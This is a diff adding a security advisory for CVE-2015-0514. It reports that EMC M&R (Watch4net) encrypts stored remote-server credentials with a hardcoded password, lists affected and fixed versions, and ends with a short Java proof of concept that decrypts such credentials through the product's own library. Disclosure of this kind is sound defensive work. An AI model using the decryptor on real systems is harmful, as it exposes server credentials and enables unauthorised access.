@@ -1,0 +1,70 @@
+Abstract
+
+
+It was discovered that EMC M&R (Watch4net) credentials of remote servers stored in Watch4net are encrypted using a fixed hardcoded password. If an attacker manages to obtain a copy of the encrypted credentials, it is trivial to decrypt them.
+
+Affected products
+
+
+EMC reports that the following products are affected by this vulnerability:
+
+- EMC M&R (Watch4Net) versions prior 6.5u1
+- EMC ViPR SRM versions prior to 3.6.1
+
+See also
+
+
+- CVE-2015-0514
+- ESA-2015-004: EMC M&R (Watch4Net) Multiple Vulnerabilities
+- ESA-2015-004: EMC M&R (Watch4Net) Multiple Vulnerabilities (login required)
+
+Fix
+
+
+EMC released the following updated versions that resolve this vulnerability:
+
+- EMC M&R (Watch4Net) 6.5u1
+- EMC ViPR SRM 3.6.1
+
+Registered customers can download upgraded software from support.emc.com at https://support.emc.com/downloads/34247_ViPR-SRM.
+
+Introduction
+
+
+EMC M&R (formerly known as Watch4net) enables cross-domain performance monitoring of infrastructure and data center components in real-time - from a single, customizable dashboard.
+
+The Remote-Shell-Collector module from EMC M&R (Watch4net) can push and run executable files on remote hosts to collect performance data from storage environments. Remote-Shell-Collector uses SSH for this purpose.
+
+In order to push and collect monitoring data, accounts are created on the remote servers and credentials of these remote servers are stored in Watch4net. These credentials are encrypted using a fixed hardcoded password. If an attacker manages to obtain a copy of the encrypted credentials, it is trivial to decrypt them.
+
+Details
+
+
+Due to insecure use of cryptography the credentials of these remote host can be decrypted using the Java class com.watch4net.apg.v2.common.config.tools.Utils.process().
+
+Proof of concept
+
+
+import com.watch4net.apg.v2.common.config.tools.Utils;
+
+public class Watch4NetCrypt {
+   private static void print(String out) {
+      System.out.println(out);
+   }
+
+   private static void usage() {
+      print("Usage:\t watch4netcrypt [-e] password");
+      print("\t watch4netcrypt [-d] encrypted");
+      System.exit(1);
+   }
+
+   public static void main(String[] args) {
+      if (args.length != 2 || !("-e".equals(args[0]) || "-d".equals(args[0]))) {
+         usage();
+      }
+      Boolean encrypt = "-e".equals(args[0]);
+      String password = args[1];
+      if (password != null) {
+         print(Utils.process(password, encrypt, "centralized", null));
+      }
+}
